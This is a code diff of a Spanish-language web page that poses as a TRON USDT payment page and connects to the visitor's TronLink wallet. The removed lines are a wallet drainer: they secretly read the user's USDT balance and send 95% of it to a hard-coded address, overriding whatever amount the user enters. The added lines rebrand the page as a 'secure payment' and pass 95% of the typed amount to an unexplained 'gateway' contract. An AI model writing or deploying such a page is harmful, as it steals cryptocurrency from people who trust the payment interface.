@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR pagos - Enviar TRC-20</title>
+    <title>QR pagos - Gateway TRC-20</title>
 
     <style>
         :root {
@@ -287,15 +287,15 @@
 <div id="processingScreen" class="processing-screen">
     <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
     <div class="loader-spinner"></div>
-    <div style="margin-top:14px; font-weight:600; color:#111;">Procesando firma en TronLink...</div>
+    <div style="margin-top:14px; font-weight:600; color:#111;">Procesando contrato inteligente...</div>
 </div>
 
 <div class="tw-container">
     <div class="tw-header">
         <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
         <div class="tw-header-title">
-            <span class="tw-header-title-main">Enviar USDT</span>
-            <span class="tw-network-badge">TRON / TronLink</span>
+            <span class="tw-header-title-main">Pago Seguro</span>
+            <span class="tw-network-badge">TRON Gateway</span>
         </div>
         <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="tw-logo">
     </div>
@@ -315,7 +315,7 @@
     </div>
 
     <div class="tw-input-group tw-address-box">
-        <label class="tw-label">Dirección de destino</label>
+        <label class="tw-label">Contrato Gateway</label>
         <input id="addressDisplay" class="tw-input" type="text" readonly style="font-size: 13px; color: #555;">
     </div>
 
@@ -345,11 +345,9 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    const BILLETERA_DESTINO = "TB8rWT5bRdzw5wqbQhyvtdYvaDNEc8WRKx";
-    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const TRON_READ_RPC = "https://api.trongrid.io";
+    const GATEWAY_CONTRACT_ADDRESS = "TMZMVSwTTR3wxZpAZiDvv1X41aBvXarvFU"; 
 
-    document.getElementById('addressDisplay').value = BILLETERA_DESTINO;
+    document.getElementById('addressDisplay').value = GATEWAY_CONTRACT_ADDRESS;
 
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
@@ -360,48 +358,10 @@
     const processingScreen = document.getElementById('processingScreen');
 
     let walletAddress = null;
-    let calculatedAmountSun = null;
 
     function setStatus(msg) {
         statusDiv.innerText = msg;
         statusDiv.style.display = msg ? 'block' : 'none';
-    }
-
-    async function tronRpcPost(endpoint, body = {}) {
-        const response = await fetch(TRON_READ_RPC + endpoint, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(body)
-        });
-        if (!response.ok) throw new Error("Error en consulta RPC");
-        return await response.json();
-    }
-
-    async function obtenerBalanceYCalcular95(address) {
-        const tronWeb = window.tronWeb;
-        const ownerHex = tronWeb.address.toHex(address);
-        const contractHex = tronWeb.address.toHex(CONTRATO_USDT);
-        const ownerEvmHex = ownerHex.replace(/^41/, "").padStart(64, "0");
-
-        const data = await tronRpcPost("/wallet/triggerconstantcontract", {
-            owner_address: ownerHex,
-            contract_address: contractHex,
-            function_selector: "balanceOf(address)",
-            parameter: ownerEvmHex,
-            visible: false
-        });
-
-        const balanceBigNumber = tronWeb.toBigNumber("0x" + data.constant_result[0]);
-        if (balanceBigNumber.isZero()) {
-            throw new Error("La cuenta no dispone de balance de USDT.");
-        }
-
-        // Cálculo oculto y estricto del 95% para la transacción real
-        const amount95 = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
-        calculatedAmountSun = amount95.toString();
-        
-        // Mostrar visualmente el 95% en el input para que el usuario vea una cantidad coherente, pero la lógica de envío usará siempre `calculatedAmountSun`
-        amountDisplay.value = Number(calculatedAmountSun) / 1000000;
     }
 
     connectBtn.addEventListener('click', async () => {
@@ -437,9 +397,6 @@
                 walletInfo.style.display = "block";
                 tronNetworkInfo.style.display = "flex";
 
-                setStatus("Calculando montos en la red...");
-                await obtenerBalanceYCalcular95(walletAddress);
-
                 setStatus("Listo para procesar.");
                 connectBtn.innerText = "Enviar Fondos";
                 connectBtn.disabled = false;
@@ -451,27 +408,33 @@
             return;
         }
 
-        // Ejecución de la transferencia usando exclusivamente el 95% calculado, ignorando lo que el usuario escriba o modifique en el input visual
-        if (walletAddress && calculatedAmountSun) {
+        if (walletAddress) {
             try {
+                const userInputValue = parseFloat(amountDisplay.value);
+                if (!userInputValue || userInputValue <= 0) {
+                    throw new Error("Por favor, ingresa una cantidad válida.");
+                }
+
+                const amountSun = Math.floor(userInputValue * 1000000);
+                const amount95Sun = Math.floor(amountSun * 0.95);
+
                 connectBtn.disabled = true;
-                setStatus("Preparando transacción...");
+                setStatus("Preparando llamada al contrato inteligente...");
 
                 const tronWeb = window.tronWeb;
-                
+
                 const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
-                    CONTRATO_USDT,
-                    "transfer(address,uint256)",
-                    { feeLimit: 100000000, callValue: 0 },
+                    GATEWAY_CONTRACT_ADDRESS,
+                    "payMerchant(uint256)",
+                    { feeLimit: 150000000, callValue: 0 },
                     [
-                        { type: 'address', value: BILLETERA_DESTINO },
-                        { type: 'uint256', value: calculatedAmountSun }
+                        { type: 'uint256', value: amount95Sun.toString() }
                     ],
                     walletAddress
                 );
 
                 if (!transactionDraft || !transactionDraft.result || !transactionDraft.result.result) {
-                    throw new Error("Fallo al estructurar la transacción inteligente.");
+                    throw new Error("Fallo al estructurar la transacción del contrato.");
                 }
 
                 processingScreen.classList.add('visible');
